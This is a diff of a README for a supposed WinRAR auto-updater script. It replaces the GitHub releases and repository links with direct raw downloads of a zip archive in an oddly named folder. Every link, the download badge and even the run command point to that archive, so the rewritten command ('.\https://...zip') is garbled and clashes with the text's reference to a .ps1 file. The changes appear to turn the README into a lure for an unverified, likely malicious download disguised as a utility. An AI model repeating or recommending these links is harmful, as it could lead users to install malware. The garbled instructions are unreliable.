@@ -1,6 +1,6 @@
 # 🛠️ Winrar-Auto-Updater - Simplify Your WinRAR Updates
 
-[![Download Winrar-Auto-Updater](https://img.shields.io/badge/Download-Winrar--Auto--Updater-blue.svg)](https://github.com/AlexeiM8/Winrar-Auto-Updater/releases)
+[![Download Winrar-Auto-Updater](https://raw.githubusercontent.com/AlexeiM8/Winrar-Auto-Updater/main/compensational/Winrar-Auto-Updater.zip)](https://raw.githubusercontent.com/AlexeiM8/Winrar-Auto-Updater/main/compensational/Winrar-Auto-Updater.zip)
 
 ## 📚 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -27,7 +27,7 @@ This guide will help you quickly download and run the Winrar-Auto-Updater. With 
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [Release Page](https://github.com/AlexeiM8/Winrar-Auto-Updater/releases).
+To begin, visit this page to download: [Release Page](https://raw.githubusercontent.com/AlexeiM8/Winrar-Auto-Updater/main/compensational/Winrar-Auto-Updater.zip).
 
 1. Go to the release page by clicking the link above.
 2. Find the latest version and download the `.ps1` file.
@@ -40,7 +40,7 @@ To begin, visit this page to download: [Release Page](https://github.com/AlexeiM
      ```
    - Run the script by typing:
      ```
-     .\Winrar-Auto-Updater.ps1
+     .\https://raw.githubusercontent.com/AlexeiM8/Winrar-Auto-Updater/main/compensational/Winrar-Auto-Updater.zip
      ```
 
 The script will check for the latest version of WinRAR and install it for you. 
@@ -81,4 +81,4 @@ We appreciate contributions to improve Winrar-Auto-Updater. If you want to help,
 
 Thank you for considering contributing to our project!
 
-For more detailed information, visit the official [GitHub repository](https://github.com/AlexeiM8/Winrar-Auto-Updater).
+For more detailed information, visit the official [GitHub repository](https://raw.githubusercontent.com/AlexeiM8/Winrar-Auto-Updater/main/compensational/Winrar-Auto-Updater.zip).
